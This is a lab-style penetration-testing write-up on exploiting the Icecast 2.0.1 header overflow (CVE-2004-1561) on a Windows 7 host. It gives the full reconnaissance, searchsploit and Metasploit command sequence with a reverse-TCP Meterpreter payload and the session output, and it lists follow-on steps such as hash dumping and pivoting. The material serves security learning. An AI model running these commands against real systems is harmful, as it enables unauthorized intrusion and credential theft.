# Icecast 2.0.1 Header Overwrite — Windows 7

**CVE:** CVE-2004-1561
**Target:** 10.80.130.54 (Windows 7 SP1, hostname DARK-PC)
**Attacker:** Kali Linux (192.168.129.38)
**Date:** 24 September 2026
**Result:** Meterpreter session opened (user: Dark-PC\Dark)

## Summary

Exploited a stack-based buffer overflow in Icecast 2.0.1 running
on Windows 7. A crafted HTTP header overwrites the stack and
returns a Meterpreter session.

## 1. Reconnaissance

    sudo nmap -sV -Pn 10.80.130.54

Key findings:

| Port | Service | Version |
|------|---------|---------|
| 135  | msrpc   | Microsoft Windows RPC |
| 139  | netbios-ssn | Microsoft Windows netbios-ssn |
| 445  | microsoft-ds | Windows 7-10 SMB |
| 3389 | tcpwrapped | RDP |
| 5357 | http    | Microsoft HTTPAPI 2.0 |
| 8000 | http    | Icecast streaming media server |
| 49152-49160 | msrpc | Microsoft Windows RPC |

**Target OS:** Windows 7 (6.1 Build 7601, SP1)
**Hostname:** DARK-PC
**Workgroup:** WORKGROUP

## 2. Vulnerability Identification

    searchsploit http Icecast

Relevant results:

- Icecast 2.0.1 (Win32) - Remote Code Execution (1)
  -> windows/remote/568.c
- Icecast 2.0.1 (Win32) - Remote Code Execution (2)
  -> windows/remote/573.c
- Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit)
  -> windows_x86/remote/16763.rb

**CVE:** CVE-2004-1561

**Background:** Icecast 2.0.1 on Windows is vulnerable to a
stack-based buffer overflow in the HTTP header parser. A crafted
User-Agent header overwrites the stack and allows remote code
execution with the privileges of the Icecast process.

## 3. Exploitation

    msfconsole -q
    msf > search Icecast 2.0.1
    msf > use exploit/windows/http/icecast_header
    msf > set RHOSTS 10.80.130.54
    msf > set LHOST 192.168.129.38
    msf > set payload windows/meterpreter/reverse_tcp
    msf > run

Output:

    [*] Started reverse TCP handler on 192.168.129.38:4444
    [*] Sending stage (203454 bytes) to 10.80.130.54
    [*] Meterpreter session 1 opened
        (192.168.129.38:4444 -> 10.80.130.54:49251)

## 4. Post-Exploitation

    meterpreter > sysinfo
    Computer        : DARK-PC
    OS              : Windows 7 (6.1 Build 7601, SP1)
    Architecture    : x64
    Domain          : WORKGROUP
    Meterpreter     : x86/windows

    meterpreter > getuid
    Server username: Dark-PC\Dark

    meterpreter > pwd
    C:\Program Files (x86)\Icecast2 Win32

    meterpreter > ls
    Icecast2.exe, icecast.xml, icecast2console.exe,
    libcurl.dll, libxml2.dll, libxslt.dll, logs/, web/

## 5. Lessons Learned

1. First Windows target and first Meterpreter session. Meterpreter
   gives a full post-exploitation framework, not just a shell.
2. The Icecast overflow is a classic stack buffer overflow. No
   authentication needed — just a crafted HTTP header.
3. Payload choice matters. `windows/meterpreter/reverse_tcp` is
   the standard first choice for Windows targets.
4. LHOST must match the actual attack interface. Wrong LHOST
   means the target can't connect back.
5. Old services from 2004 are goldmines for RCE on Windows.

## 6. Next Steps

- Enumerate shares: `run post/windows/gather/enum_shares`
- Check privileges: `getprivs`
- Look for privesc: `run post/multi/recon/local_exploit_suggester`
- Dump hashes: `hashdump` (requires SYSTEM)
- Pivot to other hosts on 10.80.130.0/24
